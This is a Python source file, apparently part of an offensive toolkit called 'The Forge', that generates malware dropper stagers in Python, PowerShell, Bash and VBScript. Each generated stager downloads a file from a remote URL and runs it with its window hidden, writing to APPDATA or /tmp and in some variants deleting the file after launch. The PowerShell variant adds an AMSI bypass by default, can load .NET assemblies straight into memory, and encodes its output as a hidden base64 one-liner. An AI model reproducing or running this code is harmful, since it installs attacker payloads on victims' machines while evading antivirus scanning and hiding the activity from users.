"""
The Forge — Dropper Stager
Download-and-execute payloads with disk and memory-only variants.
"""

import base64
import textwrap
import os


def generate_python_dropper(
    url: str,
    output_name: str = "update.exe",
    memory_only: bool = False,
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
) -> str:
    """Python dropper — download from URL and execute."""
    if memory_only:
        code = textwrap.dedent(f"""\
            import urllib.request,subprocess,tempfile,os,sys
            UA="{user_agent}"
            URL="{url}"
            try:
                req=urllib.request.Request(URL,headers={{"User-Agent":UA}})
                data=urllib.request.urlopen(req,timeout=30).read()
                # Memory execution via temp file (deleted after launch)
                tmp=os.path.join(tempfile.gettempdir(),"{output_name}")
                with open(tmp,"wb") as f:
                    f.write(data)
                if os.name=="nt":
                    subprocess.Popen(tmp,creationflags=0x08000000)  # CREATE_NO_WINDOW
                else:
                    os.chmod(tmp,0o755)
                    subprocess.Popen([tmp])
                import time;time.sleep(2)
                try:os.remove(tmp)
                except:pass
            except Exception as e:
                sys.exit(1)
        """)
    else:
        code = textwrap.dedent(f"""\
            import urllib.request,subprocess,os,sys
            UA="{user_agent}"
            URL="{url}"
            OUT=os.path.join(os.environ.get("APPDATA",os.path.expanduser("~")),"{output_name}")
            try:
                req=urllib.request.Request(URL,headers={{"User-Agent":UA}})
                data=urllib.request.urlopen(req,timeout=30).read()
                with open(OUT,"wb") as f:
                    f.write(data)
                if os.name=="nt":
                    subprocess.Popen(OUT,creationflags=0x08000000)
                else:
                    os.chmod(OUT,0o755)
                    subprocess.Popen([OUT])
            except Exception as e:
                sys.exit(1)
        """)
    return code


def generate_powershell_dropper(
    url: str,
    output_name: str = "update.exe",
    memory_only: bool = False,
    bypass_amsi: bool = True
) -> str:
    """PowerShell dropper with optional AMSI bypass."""
    amsi_bypass = ""
    if bypass_amsi:
        amsi_bypass = textwrap.dedent("""\
            try{
                $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
                $f=$a.GetField('amsiInitFailed','NonPublic,Static');
                $f.SetValue($null,$true)
            }catch{}
        """)

    if memory_only:
        code = textwrap.dedent(f"""\
            {amsi_bypass}
            [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;
            $wc=New-Object System.Net.WebClient;
            $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0");
            $data=$wc.DownloadData("{url}");
            $assembly=[System.Reflection.Assembly]::Load($data);
            $entry=$assembly.EntryPoint;
            $entry.Invoke($null,@(,[string[]]@()))
        """).strip()
    else:
        code = textwrap.dedent(f"""\
            {amsi_bypass}
            [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;
            $out="$env:APPDATA\\{output_name}";
            (New-Object System.Net.WebClient).DownloadFile("{url}",$out);
            Start-Process -WindowStyle Hidden -FilePath $out
        """).strip()

    # Encode for one-liner execution
    encoded = base64.b64encode(code.encode("utf-16-le")).decode()
    return f'powershell -nop -w hidden -enc {encoded}'


def generate_bash_dropper(url: str, output_name: str = "update") -> str:
    """Bash dropper for Linux targets."""
    return textwrap.dedent(f"""\
        #!/bin/bash
        curl -s -o /tmp/{output_name} -A "Mozilla/5.0" "{url}" && chmod +x /tmp/{output_name} && /tmp/{output_name} &
        rm -f /tmp/{output_name} 2>/dev/null
    """).strip()


def generate_vbs_dropper(url: str, output_name: str = "update.exe") -> str:
    """VBScript dropper (for legacy Windows)."""
    return textwrap.dedent(f"""\
        Set objHTTP = CreateObject("MSXML2.XMLHTTP")
        objHTTP.Open "GET", "{url}", False
        objHTTP.Send
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1
        objStream.Open
        objStream.Write objHTTP.ResponseBody
        objStream.SaveToFile CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\\{output_name}", 2
        objStream.Close
        CreateObject("WScript.Shell").Run CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\\{output_name}", 0, False
    """).strip()


# ---------------------------------------------------------------------------
# Master Generator
# ---------------------------------------------------------------------------

VARIANTS = {
    "python": generate_python_dropper,
    "powershell": generate_powershell_dropper,
    "bash": generate_bash_dropper,
    "vbs": generate_vbs_dropper,
}


def generate(url: str, language: str = "python", **kwargs) -> str:
    gen_func = VARIANTS.get(language.lower())
    if not gen_func:
        raise ValueError(f"Unknown language: {language}. Available: {list(VARIANTS.keys())}")
    return gen_func(url, **kwargs)


def list_variants() -> list[str]:
    return list(VARIANTS.keys())
